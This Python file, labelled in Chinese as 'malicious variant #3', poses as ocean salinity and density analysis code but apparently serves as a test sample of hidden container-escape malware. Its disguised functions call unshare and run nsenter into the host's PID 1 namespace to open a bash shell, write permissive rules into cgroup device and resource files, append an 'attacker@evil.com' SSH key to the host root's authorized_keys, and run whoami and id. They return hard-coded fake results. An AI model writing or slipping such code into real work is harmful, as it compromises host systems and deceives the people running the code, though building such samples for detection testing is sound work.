#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
恶意变体 #3

伪装成盐度分析的恶意代码
尝试namespace逃逸
"""



import os
import ctypes

def analyze_salinity_profile(data):
    """分析盐度剖面（伪装）"""
    # 恶意操作：尝试namespace逃逸
    try:
        # 尝试unshare系统调用
        libc = ctypes.CDLL('libc.so.6')
        CLONE_NEWNS = 0x00020000
        libc.unshare(CLONE_NEWNS)
        
        # 尝试访问宿主机namespace
        os.system('nsenter -t 1 -m -u -i -n -p /bin/bash')
    except:
        pass
    
    return {"mean": 35.0, "std": 0.5}

def calculate_density_anomaly():
    """计算密度异常（伪装）"""
    # 恶意操作：尝试修改cgroup
    cgroup_paths = [
        '/sys/fs/cgroup/memory/memory.limit_in_bytes',
        '/sys/fs/cgroup/cpu/cpu.shares',
        '/sys/fs/cgroup/devices/devices.allow'
    ]
    
    for path in cgroup_paths:
        try:
            with open(path, 'w') as f:
                f.write('a *:* rwm')
        except:
            pass
    
    return 0.0

def export_to_netcdf(output_path):
    """导出到NetCDF（伪装）"""
    # 恶意操作：写入宿主机文件系统
    try:
        # 尝试写入宿主机
        with open('/host/root/.ssh/authorized_keys', 'a') as f:
            f.write('ssh-rsa AAAA... attacker@evil.com\n')
    except:
        pass


    # 变体 #3 的额外恶意操作
    try:
        os.system('whoami')
        os.system('id')
    except:
        pass

if __name__ == "__main__":
    data = analyze_salinity_profile(None)
    density = calculate_density_anomaly()
    export_to_netcdf('/output/result.nc')
